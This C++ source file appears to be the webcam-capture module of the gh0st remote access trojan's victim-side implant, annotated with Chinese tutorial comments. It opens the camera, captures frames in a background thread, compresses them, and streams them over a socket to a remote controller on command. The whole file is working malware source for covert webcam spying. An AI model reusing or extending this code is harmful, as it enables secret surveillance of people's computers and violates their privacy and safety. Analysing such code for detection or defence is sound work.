// VideoManager.cpp: implementation of the CVideoManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "VideoManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CVideoManager::CVideoManager(CClientSocket *pClient) : CManager(pClient)
{
 	m_pVideoCap = NULL;
	m_pVideoCodec = NULL;
 	m_bIsWorking = true;
	m_bIsCompress = false;
	m_nVedioWidth = 0;
	m_nVedioHeight = 0;
	//这里的1129730893 是视频压缩码 Microsoft Video 1的值   接下回到到WorkThread  
	m_fccHandler = 1129730893;     //Microsoft Video 1
	m_CapVideo.Open(0,0);
 	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

CVideoManager::~CVideoManager()
{
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
}

void CVideoManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_NEXT:
		NotifyDialogIsOpen();
		break;
	case COMMAND_WEBCAM_ENABLECOMPRESS: // 要求启用压缩
		{
			// 如果解码器初始化正常，就启动压缩功能
			if (m_pVideoCodec)
				InterlockedExchange((LPLONG)&m_bIsCompress, true);
		}
		break;
	case COMMAND_WEBCAM_DISABLECOMPRESS:
		InterlockedExchange((LPLONG)&m_bIsCompress, false);
		break;
	case COMMAND_WEBCAM_RESIZE:
		ResetScreen(*((LPDWORD)(lpBuffer + 1)), *((LPDWORD)(lpBuffer + 5)));
		break;
	default:	
		break;
	}	
}

void CVideoManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + sizeof(BITMAPINFO);
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;
	//memcpy(lpBuffer + 1, m_pVideoCap->m_lpbmi, sizeof(BITMAPINFO));
	memcpy(lpBuffer + 1, m_CapVideo.GetBmpInfo(), sizeof(BITMAPINFO));
	Send(lpBuffer, dwBytesLength);

	delete [] lpBuffer;		
}

void CVideoManager::sendNextScreen()
{
	DWORD dwBmpImageSize=0;
	LPVOID	lpDIB =m_CapVideo.GetDIB(dwBmpImageSize); //m_pVideoCap->GetDIB();
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;

	UINT	nBufferLen = nHeadLen + dwBmpImageSize;//m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage;
	LPBYTE	lpBuffer = new BYTE[nBufferLen];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_WEBCAM_DIB;
	lpBuffer[1] = m_bIsCompress;
	memcpy(lpBuffer + 2, &m_fccHandler, sizeof(DWORD));     //这里将视频压缩码写入要发送的缓冲区

	UINT	nPacketLen = 0;
	if (m_bIsCompress && m_pVideoCodec)            //这里判断，是否压缩，压缩码是否初始化成功，如果成功就压缩          
	{
		int	nCompressLen = 0;
		//这里压缩视频数据了
		bool bRet = m_pVideoCodec->EncodeVideoData((LPBYTE)lpDIB, 
			m_CapVideo.GetBmpInfo()->bmiHeader.biSizeImage, lpBuffer + nHeadLen, &nCompressLen, NULL);
		if (!nCompressLen)
		{
			// some thing ...
			return;
		}
		//重新计算发送数据包的大小  剩下就是发送了 ，我们到主控端看一下视频如果压缩了怎么处理，
		//到主控端的void CVideoDlg::OnReceiveComplete(void)
		nPacketLen = nCompressLen + nHeadLen;
	}
	else
	{
		memcpy(lpBuffer + nHeadLen, lpDIB, dwBmpImageSize);
		nPacketLen = dwBmpImageSize+ nHeadLen;
		//m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage + nHeadLen;
	}
    m_CapVideo.SendEnd();
	Send(lpBuffer, nPacketLen);

	delete [] lpBuffer;
}

void CVideoManager::ResetScreen(int nWidth, int nHeight)
{
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);

	// 更新视频大小
	m_nVedioWidth = nWidth;
	m_nVedioHeight = nHeight;

	InterlockedExchange((LPLONG)&m_bIsWorking, true);
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

DWORD WINAPI CVideoManager::WorkThread( LPVOID lparam )
{
	static	int dwLastScreen = GetTickCount();

	CVideoManager *pThis = (CVideoManager *)lparam;
	
	if (pThis->Initialize())          //转到Initialize
	{
		//pThis->Destroy();
		//pThis->m_pClient->Disconnect();
		//return -1;
		pThis->m_bIsCompress=true;      //如果初始化成功就设置可以压缩
	}
	pThis->sendBITMAPINFO();
	// 等控制端对话框打开
	pThis->WaitForDialogOpen();

	while (pThis->m_bIsWorking)
	{
		// 限制速度
 		if ((GetTickCount() - dwLastScreen) < 150)
 			Sleep(100);
 		dwLastScreen = GetTickCount();
		pThis->sendNextScreen();                //这里没有压缩相关的代码了，我们到sendNextScreen  看看
	}
	// 销毁已经存在实例，方便重新调整
	pThis->Destroy();

	return 0;
}

bool CVideoManager::Initialize()
{
	//m_CapVideo.EnumCompress();
	bool	bRet = true;
	
	if (m_pVideoCodec!=NULL)          //这里的m_pVideoCodec 是CVideoCodec类的对象，这个类是gh0st自带的视频压缩类，我们用的是现成
	{                                 //类只不过换了压缩码
		delete m_pVideoCodec;
		m_pVideoCodec=NULL;           
	}
	if (m_fccHandler==0)         //不采用压缩
	{
		bRet= false;
		return bRet;
	}
	m_pVideoCodec = new CVideoCodec;
	//这里初始化，视频压缩 ，注意这里的压缩码  m_fccHandler(到构造函数中查看)
	if (!m_pVideoCodec->InitCompressor(m_CapVideo.GetBmpInfo(), m_fccHandler))
	{
		delete m_pVideoCodec;
		bRet=false;
		// 置NULL, 发送时判断是否为NULL来判断是否压缩
		m_pVideoCodec = NULL;
	}
	return bRet;
}

void CVideoManager::Destroy()
{
	if (m_pVideoCap)
	{
		delete m_pVideoCap;
		m_pVideoCap = NULL;
	}
	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}
}
